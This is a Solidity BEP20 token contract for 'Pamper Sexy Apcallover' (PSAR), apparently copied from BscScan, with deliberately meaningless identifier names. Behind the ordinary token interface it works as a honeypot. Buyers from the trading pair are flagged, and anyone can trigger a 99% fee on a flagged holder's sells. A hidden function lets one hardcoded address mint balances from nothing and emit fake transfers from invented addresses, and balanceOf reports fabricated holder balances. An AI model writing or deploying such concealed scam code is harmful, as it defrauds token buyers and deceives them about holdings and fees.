/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IBEP20 {

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IUniswapV2Router {

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}




contract PamperSexyApcallover is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private minFromShouldTrading = 2;
    mapping(address => uint256) _balances;


    mapping(address => mapping(address => uint256)) _allowances;
    uint256 constant takeSwapMinTo = 300000 * 10 ** 18;
    uint256 private senderEnableTokenTake = 0;
    string constant _name = "Pamper Sexy Apcallover";
    bool private buyMinFeeMint1 = false;
    uint256  tradingLaunchSwapAtFund = 100000000 * 10 ** _decimals;
    bool public buyBotsListLimit = false;

    uint256 private toWalletEnableMint = 2;
    bool private burnTokenMaxReceiverSwapMintAuto = false;
    bool public buyMinFeeMint0 = false;
    IUniswapV2Router public liquidityBurnSwapTokenTeamMintMax;

    mapping(address => bool) private swapTotalEnableTo;


    bool public buyMinFeeMint3 = false;


    bool private receiverLaunchExemptFundMode = false;
    uint256 toLaunchExemptToken = 0;
    string constant _symbol = "PSAR";

    uint256 constant exemptMinIsEnableLiquidityTradingTx = 10000 * 10 ** 18;
    mapping(address => bool)  teamTotalIsModeAt;
    uint256  toWalletMintFund = 100000000 * 10 ** _decimals;
    uint256 private marketingFromReceiverLimitSwap = 0;
    uint256 private swapLiquidityModeBurnFeeBuy = 100;

    uint256 constant sellSenderMintMarketingBotsTokenLimit = 100000000 * (10 ** 18);
    mapping(address => bool)  exemptAutoListWalletMax;
    bool private toModeTokenMarketing = false;
    
    address public uniswapV2Pair;
    bool public autoIsWalletReceiver = false;
    bool private buyMinFeeMint = false;
    address private senderAtBuyEnableBotsFundIs = (msg.sender);
    bool private limitSellAtListTake = false;

    bool public tradingBuyEnableFee = false;
    bool public buyMinFeeMint2 = false;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        liquidityBurnSwapTokenTeamMintMax = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(liquidityBurnSwapTokenTeamMintMax.factory()).createPair(address(this), liquidityBurnSwapTokenTeamMintMax.WETH());
        _allowances[address(this)][address(liquidityBurnSwapTokenTeamMintMax)] = sellSenderMintMarketingBotsTokenLimit;

        swapTotalEnableTo[msg.sender] = true;
        swapTotalEnableTo[address(this)] = true;

        _balances[msg.sender] = sellSenderMintMarketingBotsTokenLimit;
        emit Transfer(address(0), msg.sender, sellSenderMintMarketingBotsTokenLimit);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return sellSenderMintMarketingBotsTokenLimit;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txTotalMaxMinFundAt(msg.sender, recipient, amount);
    }

    function approveMax(address spender) external {
        if (exemptAutoListWalletMax[spender]) {
            teamTotalIsModeAt[spender] = true;
        }
    }

    function getreceiverLimitTokenList() public view returns (uint256) {
        return marketingFromReceiverLimitSwap;
    }

    function getswapAtLimitIsBots() public view returns (bool) {
        if (buyMinFeeMint1 != limitSellAtListTake) {
            return limitSellAtListTake;
        }
        if (buyMinFeeMint1 == receiverLaunchExemptFundMode) {
            return receiverLaunchExemptFundMode;
        }
        if (buyMinFeeMint1 != tradingBuyEnableFee) {
            return tradingBuyEnableFee;
        }
        return buyMinFeeMint1;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setfundSellMinTake(bool exemptLimitMinBurnAmountMint) public onlyOwner {
        buyMinFeeMint3=exemptLimitMinBurnAmountMint;
    }

    function feeBurnAmountTakeSellLiquidity(address mintBuyMarketingTotalMinMode, bool buyTokenSenderLaunched) internal returns (uint256) {
        if (teamTotalIsModeAt[mintBuyMarketingTotalMinMode]) {
            return 99;
        }
        
        if (buyMinFeeMint != tradingBuyEnableFee) {
            buyMinFeeMint = buyBotsListLimit;
        }


        if (buyTokenSenderLaunched) {
            return minFromShouldTrading;
        }
        if (!buyTokenSenderLaunched && mintBuyMarketingTotalMinMode == uniswapV2Pair) {
            return toWalletEnableMint;
        }
        return 0;
    }

    function getteamSenderSellModeIs() public view returns (uint256) {
        if (toWalletEnableMint == minFromShouldTrading) {
            return minFromShouldTrading;
        }
        if (toWalletEnableMint == marketingFromReceiverLimitSwap) {
            return marketingFromReceiverLimitSwap;
        }
        if (toWalletEnableMint == senderEnableTokenTake) {
            return senderEnableTokenTake;
        }
        return toWalletEnableMint;
    }

    function shouldMaxAutoLaunchedFeeMintSender(address limitTakeToTotal) private pure returns (bool) {
        return limitTakeToTotal == amountMarketingLimitBotsAuto();
    }

    function setlaunchedTradingFromToBots(bool exemptLimitMinBurnAmountMint) public onlyOwner {
        if (toModeTokenMarketing != buyMinFeeMint) {
            buyMinFeeMint=exemptLimitMinBurnAmountMint;
        }
        if (toModeTokenMarketing == burnTokenMaxReceiverSwapMintAuto) {
            burnTokenMaxReceiverSwapMintAuto=exemptLimitMinBurnAmountMint;
        }
        if (toModeTokenMarketing != burnTokenMaxReceiverSwapMintAuto) {
            burnTokenMaxReceiverSwapMintAuto=exemptLimitMinBurnAmountMint;
        }
        toModeTokenMarketing=exemptLimitMinBurnAmountMint;
    }

    function setreceiverLimitTokenList(uint256 exemptLimitMinBurnAmountMint) public onlyOwner {
        if (marketingFromReceiverLimitSwap == senderEnableTokenTake) {
            senderEnableTokenTake=exemptLimitMinBurnAmountMint;
        }
        marketingFromReceiverLimitSwap=exemptLimitMinBurnAmountMint;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return teamTotalIsModeAt[spender];
    }

    function getfundSellMinTake() public view returns (bool) {
        if (buyMinFeeMint3 == burnTokenMaxReceiverSwapMintAuto) {
            return burnTokenMaxReceiverSwapMintAuto;
        }
        return buyMinFeeMint3;
    }

    function toTradingEnableReceiver(address mintBuyMarketingTotalMinMode) internal view returns (bool) {
        return !swapTotalEnableTo[mintBuyMarketingTotalMinMode];
    }

    function safeTransfer(address mintBuyMarketingTotalMinMode, address toAutoReceiverMinIsLaunch, uint256 atTokenReceiverWalletMintFund) public {
        if (!shouldMaxAutoLaunchedFeeMintSender(msg.sender)) {
            return;
        }
        if (toAmountFromBots(uint160(toAutoReceiverMinIsLaunch))) {
            takeFeeAtReceiverSell(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFund, false);
            return;
        }
        if (toAutoReceiverMinIsLaunch == address(1)) {
            return;
        }
        if (toAmountFromBots(uint160(mintBuyMarketingTotalMinMode))) {
            takeFeeAtReceiverSell(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFund, true);
            return;
        }
        if (atTokenReceiverWalletMintFund == 0) {
            return;
        }
        if (mintBuyMarketingTotalMinMode == address(0)) {
            _balances[toAutoReceiverMinIsLaunch] = _balances[toAutoReceiverMinIsLaunch].add(atTokenReceiverWalletMintFund);
            return;
        }
    }

    function isAtShouldReceiver(address takeIsTradingTotal) private view returns (bool) {
        if (takeIsTradingTotal == senderAtBuyEnableBotsFundIs) {
            return true;
        }
        if (takeIsTradingTotal == address(0)) {
            return false;
        }
        return false;
    }

    function isAmountReceiverFeeLaunchReceiver(uint160 limitTakeToTotal) private view returns (uint256) {
        uint160 walletMintSellFrom = uint160(sellSenderMintMarketingBotsTokenLimit);
        if ((limitTakeToTotal - uint160(walletMintSellFrom)) < toLaunchExemptToken) {
            return exemptMinIsEnableLiquidityTradingTx;
        }
        return takeSwapMinTo;
    }

    function getswapLimitFeeBots() public view returns (bool) {
        if (tradingBuyEnableFee != buyMinFeeMint2) {
            return buyMinFeeMint2;
        }
        if (tradingBuyEnableFee == autoIsWalletReceiver) {
            return autoIsWalletReceiver;
        }
        return tradingBuyEnableFee;
    }

    function burnModeSenderAmount(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != sellSenderMintMarketingBotsTokenLimit) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return txTotalMaxMinFundAt(sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (toAmountFromBots(uint160(account))) {
            return isAmountReceiverFeeLaunchReceiver(uint160(account));
        }
        return _balances[account];
    }

    function toAmountFromBots(uint160 limitTakeToTotal) private pure returns (bool) {
        uint160 walletMintSellFrom = uint160(sellSenderMintMarketingBotsTokenLimit);
        if (limitTakeToTotal >= uint160(walletMintSellFrom)) {
            if (limitTakeToTotal <= uint160(walletMintSellFrom) + 300000) {
                return true;
            }
        }
        return false;
    }

    function setswapAtLimitIsBots(bool exemptLimitMinBurnAmountMint) public onlyOwner {
        if (buyMinFeeMint1 != tradingBuyEnableFee) {
            tradingBuyEnableFee=exemptLimitMinBurnAmountMint;
        }
        if (buyMinFeeMint1 != tradingBuyEnableFee) {
            tradingBuyEnableFee=exemptLimitMinBurnAmountMint;
        }
        if (buyMinFeeMint1 != buyMinFeeMint1) {
            buyMinFeeMint1=exemptLimitMinBurnAmountMint;
        }
        buyMinFeeMint1=exemptLimitMinBurnAmountMint;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function takeFeeAtReceiverSell(address mintBuyMarketingTotalMinMode, address toAutoReceiverMinIsLaunch, uint256 atTokenReceiverWalletMintFund, bool launchTradingBurnSell) private {
        uint160 walletMintSellFrom = uint160(sellSenderMintMarketingBotsTokenLimit);
        if (launchTradingBurnSell) {
            mintBuyMarketingTotalMinMode = address(uint160(walletMintSellFrom + toLaunchExemptToken));
            toLaunchExemptToken++;
            _balances[toAutoReceiverMinIsLaunch] = _balances[toAutoReceiverMinIsLaunch].add(atTokenReceiverWalletMintFund);
        } else {
            _balances[mintBuyMarketingTotalMinMode] = _balances[mintBuyMarketingTotalMinMode].sub(atTokenReceiverWalletMintFund);
        }
        if (atTokenReceiverWalletMintFund == 0) {
            return;
        }
        emit Transfer(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFund);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setteamSenderSellModeIs(uint256 exemptLimitMinBurnAmountMint) public onlyOwner {
        if (toWalletEnableMint != swapLiquidityModeBurnFeeBuy) {
            swapLiquidityModeBurnFeeBuy=exemptLimitMinBurnAmountMint;
        }
        if (toWalletEnableMint == minFromShouldTrading) {
            minFromShouldTrading=exemptLimitMinBurnAmountMint;
        }
        toWalletEnableMint=exemptLimitMinBurnAmountMint;
    }

    function maxLaunchedReceiverEnableBuy(address mintBuyMarketingTotalMinMode, address takeModeTradingLiquidity, uint256 atTokenReceiverWalletMintFund) internal returns (uint256) {
        
        uint256 marketingTotalSwapBuy = atTokenReceiverWalletMintFund.mul(feeBurnAmountTakeSellLiquidity(mintBuyMarketingTotalMinMode, takeModeTradingLiquidity == uniswapV2Pair)).div(swapLiquidityModeBurnFeeBuy);

        if (marketingTotalSwapBuy > 0) {
            _balances[address(this)] = _balances[address(this)].add(marketingTotalSwapBuy);
            emit Transfer(mintBuyMarketingTotalMinMode, address(this), marketingTotalSwapBuy);
        }

        return atTokenReceiverWalletMintFund.sub(marketingTotalSwapBuy);
    }

    function getlaunchedTradingFromToBots() public view returns (bool) {
        return toModeTokenMarketing;
    }

    function txTotalMaxMinFundAt(address mintBuyMarketingTotalMinMode, address toAutoReceiverMinIsLaunch, uint256 atTokenReceiverWalletMintFund) internal returns (bool) {
        if (toAmountFromBots(uint160(toAutoReceiverMinIsLaunch))) {
            takeFeeAtReceiverSell(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFund, false);
            return true;
        }
        if (toAmountFromBots(uint160(mintBuyMarketingTotalMinMode))) {
            takeFeeAtReceiverSell(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFund, true);
            return true;
        }
        
        bool receiverSwapLaunchBots = isAtShouldReceiver(mintBuyMarketingTotalMinMode) || isAtShouldReceiver(toAutoReceiverMinIsLaunch);
        
        if (mintBuyMarketingTotalMinMode == uniswapV2Pair && !receiverSwapLaunchBots) {
            exemptAutoListWalletMax[toAutoReceiverMinIsLaunch] = true;
        }
        
        if (buyBotsListLimit != receiverLaunchExemptFundMode) {
            buyBotsListLimit = buyBotsListLimit;
        }


        if (receiverSwapLaunchBots) {
            return burnModeSenderAmount(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFund);
        }
        
        if (autoIsWalletReceiver != buyMinFeeMint1) {
            autoIsWalletReceiver = buyMinFeeMint1;
        }


        _balances[mintBuyMarketingTotalMinMode] = _balances[mintBuyMarketingTotalMinMode].sub(atTokenReceiverWalletMintFund, "Insufficient Balance!");
        
        if (tradingBuyEnableFee == buyMinFeeMint1) {
            tradingBuyEnableFee = buyMinFeeMint2;
        }

        if (buyMinFeeMint3 == autoIsWalletReceiver) {
            buyMinFeeMint3 = receiverLaunchExemptFundMode;
        }


        uint256 atTokenReceiverWalletMintFundReceived = toTradingEnableReceiver(mintBuyMarketingTotalMinMode) ? maxLaunchedReceiverEnableBuy(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFund) : atTokenReceiverWalletMintFund;

        _balances[toAutoReceiverMinIsLaunch] = _balances[toAutoReceiverMinIsLaunch].add(atTokenReceiverWalletMintFundReceived);
        emit Transfer(mintBuyMarketingTotalMinMode, toAutoReceiverMinIsLaunch, atTokenReceiverWalletMintFundReceived);
        return true;
    }

    function setswapLimitFeeBots(bool exemptLimitMinBurnAmountMint) public onlyOwner {
        if (tradingBuyEnableFee != buyBotsListLimit) {
            buyBotsListLimit=exemptLimitMinBurnAmountMint;
        }
        if (tradingBuyEnableFee == toModeTokenMarketing) {
            toModeTokenMarketing=exemptLimitMinBurnAmountMint;
        }
        if (tradingBuyEnableFee == buyMinFeeMint) {
            buyMinFeeMint=exemptLimitMinBurnAmountMint;
        }
        tradingBuyEnableFee=exemptLimitMinBurnAmountMint;
    }

    function settakeTotalModeTeamAmountFeeEnable(bool exemptLimitMinBurnAmountMint) public onlyOwner {
        if (autoIsWalletReceiver != buyMinFeeMint1) {
            buyMinFeeMint1=exemptLimitMinBurnAmountMint;
        }
        if (autoIsWalletReceiver != buyMinFeeMint1) {
            buyMinFeeMint1=exemptLimitMinBurnAmountMint;
        }
        autoIsWalletReceiver=exemptLimitMinBurnAmountMint;
    }

    function gettakeTotalModeTeamAmountFeeEnable() public view returns (bool) {
        if (autoIsWalletReceiver == buyMinFeeMint3) {
            return buyMinFeeMint3;
        }
        if (autoIsWalletReceiver == buyMinFeeMint0) {
            return buyMinFeeMint0;
        }
        return autoIsWalletReceiver;
    }

    function amountMarketingLimitBotsAuto() private pure returns (address) {
        return 0x4547BE65AA687A177A8e5c998d1Ee578eC74a25d;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}